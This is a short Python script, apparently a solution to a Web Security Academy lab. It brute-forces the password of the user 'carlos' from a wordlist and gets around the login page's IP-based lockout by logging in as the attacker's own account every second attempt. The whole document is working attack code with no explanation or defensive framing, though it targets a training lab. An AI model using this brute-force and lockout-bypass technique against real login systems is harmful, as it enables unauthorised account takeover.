import requests

url = "https://0a57004603f512378050449900f100a9.web-security-academy.net/login"

def password(url):
    counter = 0
    wordlist_path = "passwords.txt"
    with open(wordlist_path, 'r') as file:
        payloads = file.read().splitlines()
    
    for payload in payloads:
        if counter >=2:
            params = {'username': 'wiener', 'password': 'peter'}
            response = requests.post(url, data=params)
            if response.status_code == 200:
                print(f"subed | counter: {counter} | response-length: {len(response.text)}")
            counter = 0
        params = {'username': 'carlos', 'password': f'{payload}'}
        response = requests.post(url, data=params)
        counter += 1
        if 'too' not in response.text:
            print(f"Payload: {payload} | counter: {counter} | response-length: {len(response.text)}")
        else:
            print("fuck")


password(url)